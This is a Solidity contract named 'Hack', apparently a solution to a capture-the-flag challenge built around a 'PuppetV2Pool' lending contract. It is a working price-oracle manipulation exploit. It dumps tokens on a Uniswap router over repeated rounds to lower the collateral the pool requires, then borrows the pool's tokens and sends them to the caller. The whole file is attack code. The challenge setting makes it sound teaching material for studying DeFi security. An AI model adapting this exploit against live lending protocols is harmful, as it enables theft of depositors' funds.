// SPDX-License-Identifier: HACK
pragma solidity ^0.6.0;

import "hardhat/console.sol";
import "./PuppetV2Pool.sol";

interface _IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
    function approve(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external returns (uint256);
}

interface _WETH9 {
    function deposit() payable external;
    function approve(address guy, uint wad) external returns (bool);
    function withdraw(uint wad) external;
    function balanceOf(address account) external returns (uint256);
}

interface _UniswapRouter {
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
      external
      returns (uint[] memory amounts);
    function WETH() external pure returns (address);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
  external
  payable
  returns (uint[] memory amounts);
}

contract Hack {
    constructor() public {
    }

    function run(address _token, address _uniswapRouterAddress, address _pool, address _weth) payable public {
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);
        oneRound(_token, _uniswapRouterAddress, _pool, _weth, 100000*10**18);

        _WETH9(_weth).withdraw(_WETH9(_weth).balanceOf(address(this)));

        address[] memory path = new address[](2);
        path[0] = _weth;
        path[1] = _token;
        _UniswapRouter(_uniswapRouterAddress).swapExactETHForTokens{value: address(this).balance}(
            1,
            path,
            address(this),
            block.timestamp + 3
        );

        _IERC20 token = _IERC20(_token);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function oneRound(address _token, address _uniswapRouterAddress, address _pool, address _weth, uint256 _borrow) private {
        _IERC20 token = _IERC20(_token);

        uint256 tokenBalance = token.balanceOf(address(this));

        console.log("Token balance:", tokenBalance);
        console.log("Uniswap token balance:", token.balanceOf(_uniswapRouterAddress));

        bool success = token.approve(_uniswapRouterAddress, tokenBalance);
        require(success, "Failed to approve token balance to uniswap");
        console.log("Allowance:", token.allowance(address(this), _uniswapRouterAddress));

        address[] memory path = new address[](2);
        path[0] = _token;
        path[1] = _weth;
        _UniswapRouter(_uniswapRouterAddress).swapExactTokensForETH(
            tokenBalance,
            1,
            path,
            address(this),
            block.timestamp + 3
        );

        uint256 deposit = PuppetV2Pool(_pool).calculateDepositOfWETHRequired(_borrow);
        console.log("Deposit needed:", deposit);

        _WETH9(_weth).deposit{value: address(this).balance}();
        _WETH9(_weth).approve(_pool, deposit);

        PuppetV2Pool(_pool).borrow(_borrow);

        console.log('end of round');
    }

    receive() external payable {
        console.log("Received eth from external payer");
    }
}

